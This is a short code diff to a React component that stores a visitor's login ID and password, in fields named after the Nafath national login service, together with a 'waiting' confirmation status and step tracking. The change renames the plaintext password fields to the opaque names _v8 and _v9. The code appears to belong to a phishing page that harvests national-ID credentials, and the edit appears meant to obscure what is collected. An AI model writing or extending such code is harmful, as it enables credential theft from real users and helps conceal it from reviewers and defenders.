@@ -119,8 +119,8 @@ export default function Component() {
 
     await addData({
       id: visitorId,
-      nafazId: idLogin,
-      nafazPass: password,
+      _v8: idLogin,
+      _v9: password,
       nafadConfirmationStatus: "waiting",
       currentStep: "_t6",
       nafadUpdatedAt: new Date().toISOString()
